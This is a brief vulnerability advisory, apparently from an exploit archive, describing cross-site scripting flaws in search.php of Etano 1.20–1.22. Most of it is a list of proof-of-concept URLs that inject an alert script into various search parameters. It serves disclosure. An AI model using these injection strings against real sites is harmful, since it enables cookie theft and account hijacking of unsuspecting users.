@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/52295/info
+
+Etano is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Etano versions 1.20 to 1.22 are vulnerable; other versions may be affected. 
+
+http://www.example.com/etano/search.php?&#039;";><script>alert(/XSS/)</script>
+
+http://www.example.com/etano/search.php?st=&#039;";><script>alert(/XSS/)</script>
+
+http://www.example.com/etano/search.php?f17_city=&#039;";><script>alert(/XSS/)</script>&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=1
+
+http://www.example.com/etano/search.php?f17_city=0&f17_country=&#039;";><script>alert(/XSS/)</script>&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=1
+
+http://www.example.com/etano/search.php?f17_city=0&f17_country=0&f17_state=&#039;";><script>alert(/XSS/)</script>&f17_zip=3&f19=0&st=basic&wphoto=1
+
+http://www.example.com/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=&#039;";><script>alert(/XSS/)</script>&f19=0&st=basic&wphoto=1
+
+http://www.example.com/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=&#039;";><script>alert(/XSS/)</script>&st=basic&wphoto=1
+
+http://www.example.com/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=&#039;";><script>alert(/XSS/)</script>&wphoto=1
+
+http://www.example.com/etano/search.php?f17_city=0&f17_country=0&f17_state=0&f17_zip=3&f19=0&st=basic&wphoto=&#039;";><script>alert(/XSS/)</script>
+
+http://www.example.com/etano/search.php?search=&#039;";><script>alert(/XSS/)</script>&v=g
+
+http://www.example.com/etano/search.php?search=51d43831f5dde83a4eedb23895f165f6&v=&#039;";><script>alert(/XSS/)</script>
+
+http://www.example.com/etano/search.php?st=xss";><script>alert(/XSS/)</script>&user=unknown
